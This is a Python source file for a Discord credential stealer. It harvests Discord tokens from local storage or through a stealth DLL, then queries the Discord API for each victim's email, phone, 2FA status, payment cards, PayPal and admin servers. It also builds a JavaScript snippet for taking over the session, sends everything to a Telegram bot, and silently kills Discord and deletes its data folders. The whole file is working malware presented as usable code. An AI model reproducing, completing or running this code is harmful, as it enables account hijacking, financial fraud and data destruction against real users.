
import os
import re
import json
import shutil
import subprocess
import time
from typing import List, Dict, Any, Optional
import clr
import urllib.parse
from core.obfuscation import decrypt_string
from core.bridge_manager import bridge_manager

DIVIDER = "—" * 30

def log_debug(msg):
    try:
        log_file = os.path.join(os.environ.get("TEMP", "."), "discord_module.log")
        with open(log_file, "a") as f:
            f.write(f"{time.ctime()} | {msg}\n")
    except: pass

# DLL Integration
try:
    dll_name = "discord.dll"
    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    search_paths = [
        os.path.join(project_root, "bin", dll_name),
        os.path.join(project_root, "defense", dll_name),
        os.path.join(project_root, dll_name)
    ]
    
    CS_AVAILABLE = False
    for p in search_paths:
        if os.path.exists(p):
            clr.AddReference(p)
            from StealthModule import DiscordManager
            CS_AVAILABLE = True
            break
except:
    CS_AVAILABLE = False

class DiscordStealer:
    def __init__(self, temp_dir, bot_token=None, admin_id=None, telegram_bridge=None):
        self.temp_dir = temp_dir
        self.bot_token = bot_token
        self.admin_id = admin_id
        self.telegram_bridge = telegram_bridge or ""
        self.token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"

    def _clean_token(self, token: str) -> str:
        if not token: return ""
        match = re.search(r"([a-zA-Z0-9\._\-:]{20,})", token)
        return match.group(1) if match else ""

    def steal_tokens(self) -> Dict[str, List[str]]:
        """Scans for Discord tokens using C# DLL or fallback"""
        tokens = []
        
        # 1. Native Extraction (Primary)
        if CS_AVAILABLE:
            try:
                raw = DiscordManager.GetTokens()
                if raw:
                    for t in raw.split(';'):
                        clean = self._clean_token(t)
                        if clean and clean not in tokens: tokens.append(clean)
            except Exception as e:
                log_debug(f"C# extraction error: {e}")

        # 2. Basic Python Fallback (Minimal)
        if not tokens:
            appdata = os.environ.get('APPDATA', '')
            paths = [os.path.join(appdata, 'discord', 'Local Storage', 'leveldb')]
            for p in paths:
                if not os.path.exists(p): continue
                try:
                    for f_name in os.listdir(p):
                        if not f_name.endswith(('.log', '.ldb')): continue
                        with open(os.path.join(p, f_name), 'r', errors='ignore') as f:
                            content = f.read()
                            found = re.findall(self.token_pattern, content)
                            for t in found:
                                clean = self._clean_token(t)
                                if clean and clean not in tokens: tokens.append(clean)
                except: pass

        return {'tokens': tokens}

    def get_api_data(self, token: str) -> Dict[str, Any]:
        """Retrieve data via Discord API with Bridge support"""
        import urllib.request
        import base64

        results: Dict[str, Any] = {}
        
        super_props = base64.b64encode(json.dumps({
            "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "en-US",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "browser_version": "122.0.0.0", "os_version": "10", "release_channel": "stable",
            "client_build_number": 272421
        }).encode()).decode()

        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "X-Super-Properties": super_props
        }

        # Resolve Route (Direct or Bridge)
        route = bridge_manager.get_best_route()
        use_bridge = route and route.get('type') == 'bridge'
        bridge_url = route.get('bridge_url') if use_bridge else None

        def api_request(path: str) -> Optional[Dict]:
            try:
                target_url = f"https://discord.com/api/v9{path}"
                if use_bridge:
                    final_url = f"{bridge_url}?path={urllib.parse.quote(target_url)}"
                else:
                    final_url = target_url

                req = urllib.request.Request(final_url, headers=headers)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    return json.loads(resp.read().decode())
            except: 
                return None

        # 1. User Info
        user_data = api_request("/users/@me")
        if user_data and isinstance(user_data, dict):
            nitro_type = user_data.get('premium_type', 0)
            nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro Full (Boost)", 3: "Nitro Basic"}
            results['user'] = {
                'username': user_data.get('username'),
                'id': user_data.get('id'),
                'email': user_data.get('email'),
                'verified': user_data.get('verified'),
                'phone': user_data.get('phone'),
                'nitro': nitro_map.get(nitro_type, "None"),
                'mfa_enabled': user_data.get('mfa_enabled', False),
                'locale': user_data.get('locale', 'unknown')
            }

        # 2. Billing
        billing = api_request("/users/@me/billing/payment-sources")
        if billing and isinstance(billing, list):
            methods = []
            for b in billing:
                if isinstance(b, dict):
                    if b.get('type') == 1: 
                        methods.append(f"💳 {b.get('brand', 'Card').title()} *{b.get('last_4')} ({b.get('expires_month')}/{b.get('expires_year')})")
                    elif b.get('type') == 2: 
                        methods.append(f"🅿️ PayPal ({b.get('email', 'N/A')})")
            results['billing'] = methods

        # 3. Guilds (Admin)
        guilds = api_request("/users/@me/guilds")
        if guilds and isinstance(guilds, list):
            results['guilds'] = [g['name'] for g in guilds if isinstance(g, dict) and (g.get('owner') or (int(g.get('permissions', 0)) & 0x8))]

        # 4. Relationships
        rel = api_request("/users/@me/relationships")
        if rel and isinstance(rel, list):
            friends = [r for r in rel if isinstance(r, dict) and r.get('type') == 1]
            results['friends_count'] = len(friends)
            results['pending_count'] = len([r for r in rel if isinstance(r, dict) and r.get('type') in (3, 4)])
            results['friends_sample'] = [f.get('user', {}).get('username', 'Unknown') for f in friends[:3] if isinstance(f, dict)]

        return results

    def logout(self):
        """Silently kill Discord and clear session data"""
        if CS_AVAILABLE:
            try: DiscordManager.KillDiscord()
            except: pass
        else:
            subprocess.run("taskkill /f /im Discord.exe 2>nul", shell=True, creationflags=0x08000000)

        time.sleep(1)
        appdata = os.environ.get('APPDATA', '')
        for d in ['discord', 'discordcanary', 'discordptb']:
            p = os.path.join(appdata, d)
            if os.path.exists(p):
                try: shutil.rmtree(p, ignore_errors=True)
                except: pass

    def format_token_report(self, tokens: List[str]) -> str:
        if not tokens: return ""
        
        seen_tokens = set()
        unique_tokens = []
        for t in tokens:
            cleaned = self._clean_token(t)
            if cleaned and cleaned not in seen_tokens:
                unique_tokens.append(cleaned)
                seen_tokens.add(cleaned)

        lines = [
            "💎 ✨ <b>DISCORD ANALYSIS REPORT</b> ✨ 💎",
            "🌐 <i>Scanning native modules and leveldb...</i>",
            ""
        ]

        # Cache for user data to handle multiple tokens for the same account
        user_cache = {}

        for token in unique_tokens:
            data = self.get_api_data(token)
            
            # Try to identify user ID from token prefix if API fails
            token_uid = None
            try:
                import base64
                token_uid = base64.b64decode(token.split('.')[0]).decode('utf-8')
            except: pass

            u = None
            if 'user' in data:
                u = data['user']
                user_cache[u['id']] = data # Cache full data
            elif token_uid and token_uid in user_cache:
                # Use cached data if this token failed but we have info for this user
                data = user_cache[token_uid]
                u = data['user']

            lines.append(f"📡 <code>{token}</code>")
            
            if u:
                # Quick Login JS - ONLY for valid tokens
                login_cmd = (
                    f"(function(token){{" +
                    "try{window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let r of Object.values(e.c)){if(r.exports?.default?.updateToken){r.exports.default.updateToken(token);break;}}}}])}catch(e){}" +
                    "try{window.localStorage.setItem('token', '" + token + "');}catch(e){}" +
                    "setTimeout(()=>{location.reload()},500);" +
                    f"}})('{token}')"
                )
                lines.append(f"💠 <b>Quick Login:</b> <code>{login_cmd}</code>")
                
                if 'user' not in data: # Was from cache
                    lines.append("💡 <i>(Используются кэшированные данные для этого ID)</i>")

                lines.append("")
                lines.append(f"👤 <b>User:</b> <code>{u['username']}</code>")
                lines.append(f"🆔 <b>ID:</b> <code>{u['id']}</code>")
                
                email_status = "✅" if u.get('verified') else "❌"
                lines.append(f"📧 <b>Email:</b> <code>{u['email'] or 'N/A'}</code> {email_status}")
                lines.append(f"📱 <b>Phone:</b> <code>{u['phone'] or 'N/A'}</code>")
                lines.append(f"🛡 <b>2FA:</b> {'🟢 Вкл' if u.get('mfa_enabled') else '🔴 Выкл'}")

                nitro_icons = {"Nitro Classic": "💙", "Nitro Full (Boost)": "💜 🚀", "Nitro Basic": "💛", "None": "⬛"}
                nitro = u.get('nitro', 'None')
                lines.append(f"💎 <b>Nitro:</b> {nitro_icons.get(nitro, '⬛')} {nitro}")
                lines.append(f"🌍 <b>Locale:</b> {u.get('locale', '?').upper()}")

                billing = data.get('billing', [])
                if billing:
                    lines.append(f"\n💳 <b>Billing ({len(billing)}):</b>")
                    for b in billing: lines.append(f"   {b}")
                else:
                    lines.append("💳 <b>Billing:</b> ❌ Нет методов")

                fr_count = data.get('friends_count', 0)
                pend_count = data.get('pending_count', 0)
                friends_str = f"👥 <b>Друзья:</b> {fr_count}"
                if pend_count: friends_str += f" (⏳ {pend_count} ожид.)"
                lines.append(friends_str)
                
                sample = data.get('friends_sample')
                if sample: lines.append(f"   <i>Напр: {', '.join(sample)}</i>")

                guilds = data.get('guilds', [])
                if guilds:
                    lines.append(f"🏰 <b>Admin серверов:</b> <i>{', '.join(guilds[:5])}</i>")
            else:
                lines.append("⚠️ <b>Invalid/Expired Token</b>")

            if unique_tokens.index(token) < len(unique_tokens) - 1:
                lines.append(DIVIDER)

        return "\n".join(lines)

    def send_full_report(self, tokens: list, bot_token: str, admin_id: int, telegram_bridge: str = "") -> bool:
        if not tokens: return False
        import urllib.request
        base = telegram_bridge.rstrip('/') if telegram_bridge else "https://api.telegram.org"
        url = f"{base}/bot{bot_token}/sendMessage"
        
        report = self.format_token_report(tokens)
        
        # Handle large reports by splitting into chunks (limit 4096)
        chunks = [report[i:i+4000] for i in range(0, len(report), 4000)]
        success = True
        for chunk in chunks:
            try:
                payload = json.dumps({
                    "chat_id": admin_id, 
                    "text": chunk, 
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }).encode()
                req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req, timeout=10)
            except: 
                success = False
        return success